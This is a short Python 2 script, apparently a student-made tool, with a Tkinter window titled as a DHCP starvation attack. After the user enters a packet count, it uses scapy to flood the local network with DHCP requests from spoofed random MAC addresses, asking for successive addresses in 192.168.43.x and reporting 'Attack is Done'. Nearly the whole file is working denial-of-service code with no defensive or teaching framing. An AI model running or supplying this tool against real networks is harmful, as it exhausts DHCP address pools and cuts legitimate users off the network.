#!usr/bin/python
import urllib
import sys
import os
from scapy.all import *
from Tkinter import *

root=Tk()


try :
	stri = "https://www.google.co.in"
	data = urllib.urlopen(stri)
	print "Connected"
  
	layer2_broadcast = "ff:ff:ff:ff:ff:ff"
	conf.checkIPaddr = False #To stop scapy from checking return packet originating from any packet that we have sent out

	IP_address_subnet = "192.168.43."  
	global a
	def Naming():
		global a
		name = int(text.get())
		for ip in range(0,name):
		   
    	
        	    for i in range (0,1):
        	        bogus_mac_address = RandMAC()
        	        dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=bogus_mac_address)/DHCP(options=[("message-type","request"),("server_id","192.168.43.1"),("requested_addr", IP_address_subnet + str(ip)),"end"])
        	        sendp(dhcp_request)
			
			#a="Requesting: " + IP_address_subnet + str(ip) + "\n"
        	        print ("Requesting: " + IP_address_subnet + str(ip) + "\n")
        	        time.sleep(1) 
		print "Attack is Done And ",name,"Packets are Sent to DHCP Server."
		

		
    
except :
    print "not connected" 

 #   dhcp_starvation()  
root.destroy()

root = Tk()
root.geometry("750x400")
root.title("WELCOME TO ATTACK OF DHCP STARVATION ")


lbl=Label(root,text="Enter how many packets you want to send ")
lbl.grid(column=5,row=5)
text=Entry(root,width=30, bg="pink")
text.grid(column=10,row=5)

text.focus_force()

nameButton = Button(root, text="Perform", command=Naming)
nameButton.grid(column=15,row=10)
	


root.mainloop()
